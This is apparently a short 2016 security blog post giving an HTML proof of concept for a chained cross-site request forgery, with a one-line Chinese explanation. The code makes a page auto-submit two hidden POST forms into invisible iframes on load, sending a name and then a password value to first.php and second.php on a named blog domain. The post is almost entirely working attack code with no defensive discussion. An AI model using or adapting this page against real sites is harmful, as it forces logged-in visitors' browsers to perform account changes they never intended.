---
title: Multi CSRF POC
date: 2016-05-31 17:43:35
tags: CSRF
---

### CSRF POC
> 请求两次CSRF达到最终效果，POST-->first.php-->second.php

```
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<html>
  <body>
    <form id="form1" target='csrfIframe1' action="http://blog.safebuff.com/first.php" method="POST">
      <input type="hidden" name="name" value="小乐天" />
      <input type="submit" value="Submit request" />
    </form>
    <form id="form2" target='csrfIframe2' action="http://blog.safebuff.com/second.php" method="POST">
<input type="hidden" name="password" value="sec" />
      <input type="submit" value="Submit request" />
    </form>
<script>
    window.onload = function() {
        document.getElementById("form1").submit();
 	    document.getElementById("form2").submit();
    }
</script>
<iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe1"></iframe>
<iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe2"></iframe>
  </body>
</html>
```
